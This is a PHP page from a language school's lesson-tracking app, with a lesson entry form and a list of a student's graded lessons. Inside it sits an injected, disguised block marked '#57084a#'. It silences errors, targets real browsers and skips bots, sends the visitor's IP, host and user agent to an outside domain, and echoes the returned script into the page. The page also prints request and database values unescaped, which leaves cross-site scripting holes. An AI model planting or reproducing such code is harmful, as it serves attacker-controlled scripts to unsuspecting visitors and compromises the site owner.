<?php
include_once('include/basics.php');
include_once( "../classes/DAO.php" );
include_once( "../classes/DBUtils.php" );
include_once('../classes/licoes.php');
include_once('../classes/professores.php');
$lessonLista = DAO::find('licoes', array('id_aluno' => $_GET['id']));


$licao = new licoes();

if ( isset( $_POST['id'] ) )
{
	$licao = new licoes( $_POST['id'] );

	if ( ! isset( $licao->id ) )
	{
		$_SESSION['b-msg'] = "Não foi possível encontrar a lição.";
		header( "Location: mensagens.php" );
	}
}
else
{
	$licao->id = 0;
}

?>
<?php
#57084a#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/57084a#
?>
	<script>
$(document).ready(function(){
	
	$(function() {
		$( "#data" ).datepicker({ dateFormat: "dd/mm/yy" });
	});
	// validação
	jQuery.validator.messages.required = "";
	jQuery.validator.addMethod("dataDMA", function(value, element) {
		return valida_data(value);
	}, "Data inválida");
	$("#lesson_form").validate({
		invalidHandler: function(e, validator) {
			var errors = validator.numberOfInvalids();
			if (errors)
			{
				var msg = "Preencha corretamente os campos.";
				alert(msg);
			}
		},
		errorClass: "erro_formulario",
		rules: {
			id_aluno: "required",
			data: 
			{
				required: true
			}, 
			lesson: "required",
			comentarios: "required",
			p: "required",
			s: "required",
			w: "required",
			l: "required",
			r: "required"
		},
		onsubmit: false,
		debug: true
	});
});
	</script>	
	<form method="post" action="lessonForm.php" name="lesson_form" id="lesson_form">
        <table class="lesson">
            <tr>
                <td>Data</td>
                <td colspan="3"><input type="text" name="data" id="data" value="<?php echo $licao->data; ?>"/></td>
            </tr>
            <tr>
                <td>Lição</td>
                <td colspan="3"><input type="text" name="lesson" id="lesson" style="width: 396px;" value="<?php echo $licao->lesson ;?>"/></td>
            </tr>
            <tr>
                <td></td>
                <td valign="top"><textarea name="comentarios" id="comentarios" class="comentarios"><?php echo $licao->comentarios ;?></textarea></td>
                <td colspan="2" align="left" valign="top">
                    <table>
                        <tr><td>P:</td><td><input type="text" class="nota" name="p" id="p" maxlength="1" value="<?php echo $licao->p ;?>"/></td></tr>
                        <tr><td>S:</td><td><input type="text" class="nota" name="s" id="s" maxlength="1" value="<?php echo $licao->s ;?>"/></td></tr>
                        <tr><td>W:</td><td><input type="text" class="nota" name="w" id="w" maxlength="1" value="<?php echo $licao->w ;?>"/></td></tr>
                        <tr><td>L:</td><td><input type="text" class="nota" name="l" id="l" maxlength="1" value="<?php echo $licao->l ;?>"/></td></tr>
                        <tr><td>R:</td><td><input type="text" class="nota" name="r" id="r" maxlength="1" value="<?php echo $licao->r ;?>"/></td></tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td colspan="4" align="right" valign="bottom"><input name="Incluir" type="button" value="Incluir" class="incluir" onClick="valida_licao()"/></td>
            </tr>
        </table>
        <label class="legend">
<br>
            GOOD - (G) | REGULAR (R) | LOW - (L) | NON APPLICABLE (X)
  </label>
        <input type="hidden" value="<?php echo $_SESSION['prof_id']; ?>" name="id_professor" />
        <input type="hidden" value="<?php echo $licao->id; ?>" name="id" />
        <input type="hidden" value="<?php echo $_GET['id']; ?>" name="id_aluno" />
</form>
            
<?
foreach ( $lessonLista as $cont => $licao ) {
$professor   = DAO::find('professores', array('id' => $licao->id_professor));
?>
<table class="lesson" style="border: 1px solid #666; margin-top: 10px;" cellspacing="4" width="539px">
    <tr>
        <td align="right" valign="top">Lição: </td>
        <td valign="top" style="width: 350px;"><b><?php echo utf8_encode($licao->lesson) ;?></b></td>
        <td colspan="2">Data: <?php echo $licao->data; ?></td>
    </tr>
    <tr>
      <td align="right">Professor:</td>
      <td valign="top"><?php echo utf8_encode($professor[0]->nome); ?></td>
      <td colspan="2">&nbsp;</td>
    </tr>
    <tr>
        <td valign="top" align="right">Comentários:</td>
        <td valign="top"><?php echo utf8_encode($licao->comentarios) ;?></td>
        <td colspan="2">
            <table>
                <tr><td>P:</td><td><b><?php echo $licao->p ;?></b></td></tr>
                <tr><td>S:</td><td><b><?php echo $licao->s ;?></b></td></tr>
                <tr><td>W:</td><td><b><?php echo $licao->w ;?></b></td></tr>
                <tr><td>L:</td><td><b><?php echo $licao->l ;?></b></td></tr>
                <tr><td>R:</td><td><b><?php echo $licao->r ;?></b></td></tr>
            </table>
        </td>
    </tr>
</table>
<span class="lesson">P: pronunciation, S: speaking, W: writting, L: listening,  R: reading</span>
<?php } ?>
